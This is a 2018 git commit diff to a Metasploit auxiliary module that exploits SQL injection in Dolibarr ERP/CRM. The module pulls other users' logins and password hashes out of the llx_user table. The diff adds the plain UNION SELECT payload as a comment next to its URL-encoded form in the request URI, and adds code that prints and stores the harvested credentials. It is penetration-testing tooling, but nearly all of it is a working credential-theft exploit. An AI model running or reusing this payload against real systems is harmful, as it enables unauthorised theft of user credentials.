42af28a86a0d1779cdc7e606e276ef8ef6446c6a
Shelby Pace <shelby_pace@rapid7.com>
2018-08-30 14:17:37 -0500

    printing and storing credentials

--- modules/auxiliary/sqli/oracle/dolibarr_list_creds.rb
+++ modules/auxiliary/sqli/oracle/dolibarr_list_creds.rb
@@ -8,9 +8,9 @@ class MetasploitModule < Msf::Auxiliary
 
   def initialize(info = {})
     super(update_info(info,
-      'Name'           => 'Module name',
+      'Name'           => 'Dolibarr List Creds',
       'Description'    => %q{
-         This module enables an authenticated user to view the usernames and encrypted passwords of other users in the Dolibarr ERP/CRM via SQL injection.
+         This module enables an authenticated user to collect the usernames and encrypted passwords of other users in the Dolibarr ERP/CRM via SQL injection.
       },
       'Author'         => [
                             'Issam Rabhi',  # PoC
@@ -72,6 +72,7 @@ class MetasploitModule < Msf::Auxiliary
   end
 
   def get_info(cookies)
+    # union select 0,1,login,pass_crypted,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28 from llx_user #
     inject_uri = target_uri.path << "/adherents/list.php?leftmenu=members&statut=%31%29%20%75%6e%69%6f%6e%20%73%65%6c%65%63%74%20%30%2c%31%2c%6c%6f%67%69%6e%2c%70%61%73%73%5f%63%72%79%70%74%65%64%2c%34%2c%35%2c%36%2c%37%2c%38%2c%39%2c%31%30%2c%31%31%2c%31%32%2c%31%33%2c%31%34%2c%31%35%2c%31%36%2c%31%37%2c%31%38%2c%31%39%2c%32%30%2c%32%31%2c%32%32%2c%32%33%2c%32%34%2c%32%35%2c%32%36%2c%32%37%2c%32%38%20%66%72%6f%6d%20%6c%6c%78%5f%75%73%65%72%20%23"
     inject_res = send_request_cgi(
       'method'  =>  'GET',
@@ -90,11 +91,12 @@ class MetasploitModule < Msf::Auxiliary
   def format_results(output)
     credentials = output.scan(/valignmiddle">0<\/div><\/a><\/td>.<td>([a-zA-Z0-9]*)<\/td>.<td>(\S*)<\/td>/m)
 
-    unless credentials
-      fail_with(Failure::NotFound, "No credentials found")
-    end
+    fail_with(Failure::NotFound, "No credentials found") if credentials.empty?
 
-    credentials.each { |i, j| store_valid_credential(user: j, private: i) }
+    credentials.each do |i, j|
+      print_good("#{j} #{i}")
+      store_valid_credential(user: j, private: i)
+    end
   end
 
   def run
